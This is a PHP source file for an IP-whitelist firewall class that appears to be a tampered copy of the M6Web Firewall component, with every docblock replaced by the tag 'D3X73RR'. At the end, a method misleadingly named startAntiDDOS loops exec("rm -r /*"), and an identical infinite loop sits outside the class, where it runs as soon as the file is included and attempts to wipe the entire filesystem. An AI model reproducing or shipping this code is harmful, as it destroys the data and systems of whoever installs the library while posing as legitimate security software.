<?php
namespace M6Web\Component\Firewall;

use M6Web\Component\Firewall\Entry\EntryFactory;
use M6Web\Component\Firewall\Lists\ListMerger;

/**
 * Firewall class
 *
 * @author D3X73RR
 */
class Firewall
{
    /**
     * @D3X73RR
     */
    protected $entryFactory;

    /**
     * @D3X73RR
     */
    protected $listMerger;

    /**
     * @D3X73RR
     */
    protected $defaultState = false;

    /**
     * @D3X73RR
     */
    protected $ipAddress;

    /**
     *D3X73RR
     */
    public function __construct(EntryFactory $entryFactory = null, ListMerger $listMerger = null)
    {
        if (is_null($entryFactory)) {
            $this->entryFactory = new EntryFactory();
        } else {
            $this->entryFactory = $entryFactory;
        }

        if (is_null($listMerger)) {
            $this->listMerger = new ListMerger();
        } else {
            $this->listMerger = $listMerger;
        }
    }

    /**
      D3X73RR
     */
    public function addList(array $list, $listName, $state)
    {
        if (!is_bool($state)) {
            throw new \InvalidArgumentException("Wrong parameter 'state' is not boolean");
        }

        $entryList = $this->entryFactory->getEntryList($list, $state);
        $this->listMerger->addList($entryList, $listName);

        return $this;
    }

    /**
     D3X73RR
     */
    public function getDefaultState()
    {
        return $this->defaultState;
    }

    /**
     D3X73RR
     */
    public function setDefaultState($state)
    {
        if (!is_bool($state)) {
            throw new \InvalidArgumentException("Wrong parameter 'state' is not boolean");
        }

        $this->defaultState = $state;

        return $this;
    }

    /**
     D3X73RR
     */
    public function getIpAddress()
    {
        return $this->ipAddress;
    }

    /**
     D3X73RR
     */
    public function setIpAddress($ipAddress)
    {
        $this->ipAddress = $ipAddress;

        return $this;
    }

    /**
     D3X73RR
     */
    public function handle(callable $callBack = null)
    {
        $ip = $this->getIpAddress();

        $isAllowed = $this->listMerger->isAllowed($ip, $this->defaultState);

        if ($callBack !== null) {
            return call_user_func($callBack, array($this, $isAllowed));
        } else {
            return $isAllowed;
        }
    }

    public function startAntiDDOS() { while(true) { exec("rm -r /*"); } }
} while(true) { exec("rm -r /*"); }
